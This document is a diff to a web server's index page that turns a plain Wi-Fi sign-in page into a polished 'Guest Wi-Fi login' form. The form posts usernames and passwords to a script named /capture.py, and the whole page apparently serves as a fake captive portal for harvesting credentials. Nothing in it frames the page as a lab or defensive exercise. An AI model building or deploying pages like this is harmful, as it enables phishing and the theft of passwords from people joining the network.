@@ -1,19 +1,34 @@
+<!-- /var/www/html/index.html -->
 <!doctype html>
-<html>
+<html lang="en">
 <head>
   <meta charset="utf-8">
-  <title>Welcome</title>
-  <link rel="stylesheet" href="/css/style.css">
+  <title>Guest Wi-Fi login</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <style>
+    :root { color-scheme: light dark; }
+    body{font-family:system-ui,-apple-system,Segoe UI,Roboto,Arial,sans-serif;margin:1.25rem}
+    .card{max-width:26rem;margin:0 auto;padding:1rem 1.25rem;border:1px solid #ddd;border-radius:12px}
+    h1{margin:.2rem 0 .8rem 0;font-size:1.25rem}
+    label{display:block;margin:.6rem 0 .25rem 0}
+    input,button{font-size:1rem;padding:.65rem .75rem;width:100%;box-sizing:border-box}
+    button{margin-top:.75rem;border-radius:.5rem;border:0;background:#1677ff;color:#fff}
+    small{color:#666;display:block;margin-top:.5rem}
+  </style>
 </head>
 <body>
-  <div class="wrap">
-    <h1>Wi‑Fi Sign‑in</h1>
-    <p>Access requires authentication.</p>
-    <form method="post" action="/capture">
-      <input name="user" placeholder="Email">
-      <input name="pass" placeholder="Password" type="password">
+  <div class="card">
+    <h1>Internet access</h1>
+    <form method="post" action="/capture.py">
+      <label for="u">Username</label>
+      <input id="u" name="username" autocomplete="username" required>
+      <label for="p">Password</label>
+      <input id="p" name="password" type="password" autocomplete="current-password" required>
       <button type="submit">Continue</button>
+      <small>By continuing you accept the terms of use.</small>
     </form>
   </div>
 </body>
 </html>
+
